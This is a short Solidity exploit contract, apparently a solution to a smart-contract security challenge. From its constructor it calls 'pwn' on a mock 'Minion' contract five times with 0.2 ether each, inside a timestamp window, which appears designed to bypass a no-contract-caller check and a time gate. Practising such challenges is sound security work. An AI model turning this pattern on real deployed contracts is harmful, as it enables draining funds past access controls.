import "./MockAccessControl.sol";

contract AttackMockAccessControl {
    Minion public minion;
    bool public Done;

    constructor(address _addr) payable {
        require(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60, "Not the right time");
        Minion(_addr).pwn{value: 0.2 ether}();
        Minion(_addr).pwn{value: 0.2 ether}();
        Minion(_addr).pwn{value: 0.2 ether}();
        Minion(_addr).pwn{value: 0.2 ether}();
        Minion(_addr).pwn{value: 0.2 ether}();
        // Attack();
    }

    // function Attack() public payable {
    //     if (block.timestamp % 120 >= 0 && block.timestamp % 120 < 60) {
    //         // minion = Minion(_addr);
    //         minion.pwn{value: 0.2 ether}();
    //         minion.pwn{value: 0.2 ether}();
    //         minion.pwn{value: 0.2 ether}();
    //         minion.pwn{value: 0.2 ether}();
    //         minion.pwn{value: 0.2 ether}();
    //     }
    // }

}